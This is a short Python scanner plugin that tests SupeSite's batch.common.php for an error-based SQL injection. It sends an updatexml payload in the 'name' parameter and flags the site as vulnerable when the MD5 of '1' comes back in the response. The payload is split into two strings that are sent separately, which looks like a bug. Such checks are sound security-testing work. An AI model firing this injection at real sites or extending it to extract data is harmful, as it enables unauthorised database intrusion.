#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Tian.Te
def assign(service,arg):
    if service == "supesite":
        return True, arg

def audit(arg):
    payloads = ('/batch.common.php?action=modequote&cid=1&name=members where 1=1 and 1=(',
               'updatexml(1,concat(0x5e24,(select md5(1)),0x5e24),1))%23')
    for payload in payloads:
        target = arg + payload

        code, head, res,errcode,finalurl = curl.curl('"%s"' % target)
        if code == 200:
            if "c4ca4238a0b923820dcc509a6f75849b" in res:
                security_hole(target)

if __name__ == "__main__":
    from dummy import *
    audit(assign('supesite', 'http://www.example.com/')[1])